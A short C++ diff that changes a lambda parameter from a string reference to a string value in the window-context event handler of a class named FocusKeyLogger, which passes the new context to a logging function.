@@ -11,7 +11,7 @@ void FocusKeyLogger::Run()
 }
 
 void FocusKeyLogger::RunKeyLogger() {
-	_eventListener->Register("OnWindowsContextChanged", [&](std::string clientId, std::string &newContext) {
+	_eventListener->Register("OnWindowsContextChanged", [&](std::string clientId, std::string newContext) {
 		PushKeyLog(newContext);
 	});
 
